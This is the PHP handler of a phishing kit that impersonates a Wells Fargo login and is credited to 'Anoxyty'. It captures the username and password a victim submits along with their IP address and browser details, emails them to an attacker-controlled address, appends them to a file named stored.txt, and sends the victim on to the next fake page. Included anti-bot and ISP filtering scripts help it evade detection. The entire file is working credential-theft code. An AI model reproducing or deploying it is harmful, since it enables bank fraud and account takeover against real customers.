<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include ("anti/bot.php");
	include ("anti/iprange.php");
	include ("anti/wrd.php");
	include ("anti/isp.php");
	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['usernamzz1'] ) ) {
		
		$_SESSION['usernamzz1'] 	  = $_POST['usernamzz1'];
		$_SESSION['passzz1'] 	  = $_POST['passzz1'];
		$code = <<<EOT
============== [ WellsFargo Login By Anoxyty | ]🔥 ==============
[USERNAME 2] 		: {$_SESSION['usernamzz1']}
[PASSWORD 2]		: {$_SESSION['passzz1']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 WellsFargo Login By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼User Info 2 By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁WellsFargo <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: step1.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>